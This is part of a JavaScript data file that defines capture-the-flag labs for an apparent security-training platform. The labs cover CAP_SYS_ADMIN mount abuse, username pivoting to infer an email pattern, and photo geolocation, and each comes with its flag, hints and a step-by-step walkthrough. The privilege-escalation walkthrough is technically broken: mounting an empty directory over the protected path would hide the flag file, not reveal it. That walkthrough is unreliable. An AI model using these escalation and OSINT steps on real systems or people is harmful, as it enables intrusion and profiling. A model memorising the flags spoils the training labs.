    level: 5,
    labType: "OFFLINE",
    points: 200,
    tags: ["Capabilities", "CAP_SYS_ADMIN", "Container Escape"],
    description: `A diagnostics helper carries CAP_SYS_ADMIN so it can mount a scratch filesystem. Mount anything you like over a root-owned path and read what the capability should never have allowed.`,
    objective: "Use an over-privileged binary's CAP_SYS_ADMIN to mount over a protected path and read the flag.",
    prerequisites: ["Linux capabilities", "mount semantics"],
    tools: ["getcap", "unshare", "Bash"],
    cwe: "CWE-269",
    mitre: "T1548",
    mitigation: "Never grant CAP_SYS_ADMIN to non-root binaries; mount namespaces plus dropped capabilities are the correct primitive.",
    flag: "VR{cap_sysadmin_mount_escape}",
    hints: [
      { order: 1, text: "Enumerate file capabilities before SUID — the answer is not a setuid bit.", pointsPenalty: 20 },
      { order: 2, text: "CAP_SYS_ADMIN permits mount. Which root-owned path would let you read a protected file once replaced?", pointsPenalty: 25 },
    ],
    walkthroughs: [
      {
        title: "Enumerate, Mount, Read",
        tool: "getcap",
        order: 1,
        content: `# CAP_SYS_ADMIN Abuse

## Step 1 — Enumerate capabilities
\`\`\`bash
getcap -r / 2>/dev/null
\`\`\`
\`/usr/local/bin/vr-diag = cap_sys_admin+ep\`

## Step 2 — Mount a scratch overlay
\`\`\`bash
mkdir -p /tmp/empty
/usr/local/bin/vr-diag --mount /tmp/empty /opt/protected
\`\`\`
The helper mounts the source you supply onto the destination you supply, both as root.

## Step 3 — Read through the mount
\`\`\`bash
ls /opt/protected
cat /opt/protected/flag.txt
\`\`\`
Overlaying a directory the process can see bypasses the path traversal protections entirely.`,
      },
    ],
  },

  // ══ OSINT (2) ══════════════════════════════════════════════════════════════
  {
    slug: "osint-username-pivot",
    name: "Handle Trail",
    category: "OSINT",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["Username Enumeration", "Correlation", "Email Pattern"],
    description: `A fictional ViperRange persona reuses one handle across three invented platforms. Correlate the accounts, infer the organisation's email pattern from a public signature, then recover the flag embedded in a fictional mailbox autoresponder.`,
    objective: "Pivot a single fictional handle across platforms to derive an email pattern and the guarded flag.",
    prerequisites: ["Search operators", "Pattern inference"],
    tools: ["Browser"],
    cwe: "CWE-200",
    mitre: "T1589.002",
    mitigation: "Use distinct handles per service and avoid publishing address patterns in signatures.",
    flag: "VR{username_pivot_email_pattern}",
    hints: [
      { order: 1, text: "The handle appears on a fictional forum, a code host and a photo site. The email is only on one of them.", pointsPenalty: 10 },
      { order: 2, text: "The organisation page lists one employee's full address. Infer the pattern and apply it to the handle.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "One Handle, Three Accounts",
        tool: "Browser",
        order: 1,
        content: `# Username Pivot

## Step 1 — Enumerate the handle
Search the fictional case index for \`echo_relay\`. Three invented profiles appear: a forum, a code host and a photo site.

## Step 2 — Find the pattern
The forum signature of a different fictional employee reads \`firstname.lastname@rivenport-labs.example\`.

## Step 3 — Apply and recover
\`\`\`
echo.relay@rivenport-labs.example
\`\`\`
The mailbox's autoresponder in the case archive quotes the onboarding token, which is the flag.`,
      },
    ],
  },
  {
    slug: "osint-geolocation",
    name: "Pinned Horizon",
    category: "OSINT",
    level: 5,
    labType: "OFFLINE",
    points: 200,
    tags: ["Geolocation", "Chronolocation", "Imagery"],
    description: `A fictional photograph in the ViperRange archive was taken from a rooftop. Use the invented skyline, signage and shadow direction to place it — then take the coordinate to the case's flag endpoint.`,
    objective: "Determine the fictional photograph's location and time from visual and textual clues.",
    prerequisites: ["Shadow analysis", "Map reading"],
    tools: ["Browser", "Maps"],
    cwe: "CWE-200",
    mitre: "T1591.004",
    mitigation: "Strip geotags and avoid publishing landmark-identifiable interiors.",
    flag: "VR{geolocated_rooftop_coordinate}",
    hints: [
      { order: 1, text: "Signage in the lower-left corner names a fictional district. Shadows give the time of day.", pointsPenalty: 20 },
      { order: 2, text: "The case brief says the photo was taken at 15:20 local time — the flag is the coordinate rounded to three decimals.", pointsPenalty: 25 },
    ],
    walkthroughs: [
      {
        title: "Skyline to Coordinate",
        tool: "Browser",
        order: 1,
        content: `# Geolocation

## Step 1 — Extract text clues
The storefront in the lower left reads \`HALVARD DISTRICT\` — an invented district in the fictional city of Rivenport.

## Step 2 — Match the skyline
The archive's city map has exactly one rooftop with that three-tower sightline.

## Step 3 — Compute and submit
The identified rooftop's map coordinate, rounded to three decimals, is the flag body. Submit it in the \`VR{...}\` envelope.`,
      },
    ],
  },
];

// Canonical ordering for the original 36 labs that remain after deprecation.
// Codes VR-001..VR-036; the 14 new labs continue at VR-037..VR-050.
const CODE_ORDER = [
  "file-oracle", "session-architect", "cipher-gate", "loose-types", "template-engine",
  "narrow-key", "block-flip", "chinese-broadcast", "masked-xor", "rotor-maze",
  "stego-lock", "binary-carve", "braille-cipher", "hex-delta", "invisible-script",
  "alias-prison", "deep-grep", "chroot-breach",
  "overflow-zero", "overflow-one", "return-jump", "format-string", "smash-stack",
  "pascal-decoder", "multi-layer", "bytecode-maze", "math-circuit", "egg-matrix",
  "digital-echo", "ghost-archive", "shadow-agent",
  "eval-escape", "voice-inject", "pixel-cache", "crawler-protocol", "style-injector",
];

// Resolve difficulty enum + code for every new lab.
NEW_LABS.forEach((lab, i) => {
  lab.difficulty = LEVEL_TO_DIFFICULTY[lab.level];
  lab.code = `VR-${String(37 + i).padStart(3, "0")}`;
  lab.artifacts = [];
});

module.exports = {
  DEPRECATED,
  REMAP,
  META,
  NEW_LABS,
  CODE_ORDER,
  LEVEL_TO_DIFFICULTY,
};
